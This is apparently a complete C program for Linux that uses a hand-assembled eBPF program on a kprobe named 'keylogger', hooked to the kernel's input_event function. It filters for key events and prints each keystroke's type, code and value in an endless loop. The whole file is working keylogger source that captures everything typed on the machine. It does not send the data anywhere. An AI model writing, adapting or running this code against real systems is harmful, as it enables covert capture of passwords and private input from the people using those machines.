#include <inttypes.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "kprobes.h"
#include "ring_queue.h"

int create_program();
int create_perf_event();

int main() {
  ring_queue_t* queue = ring_queue_create(31, 12);
  if (!queue) {
    perror("ring_queue_create");
    return 1;
  }
  int progFd = create_program(queue);
  int perfFd = create_perf_event();
  if (attach_program(progFd, perfFd)) {
    perror("attach_program");
    return 1;
  }
  while (1) {
    int value[3];
    while (ring_queue_pop(queue, &value)) {
      printf("type=%d code=%d value=%d\n", value[0], value[1], value[2]);
    }
    usleep(100000);
  }
  return 0;
}

int create_program(ring_queue_t* queue) {
  struct bpf_insn program[] = {
      // Copy RSI, RDX, RCX into the stack at FP[-16].
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 13 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -16, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 12 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -12, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 11 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -8, 0},

      // Store 0 in header scratch space.
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -20, 0},

      // Load the event type into R0.
      {BPF_LDX | BPF_MEM | BPF_W, 0, 1, 13 * 8, 0},
      // Only look at key events (type == 1).
      {BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 2, 1},
      // Exit with a zero status.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},

      PUSH_QUEUE(queue, -16, -28, -4)

      // Terminate the program.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},
  };
  return load_kprobe_bpf(program, sizeof(program) / sizeof(struct bpf_insn));
}

int create_perf_event() {
  int fd = create_open_kprobe("keylogger", "p:kprobes/keylogger input_event");
  if (fd < 0) {
    perror("create_open_kprobe");
    exit(1);
  }
  return fd;
}
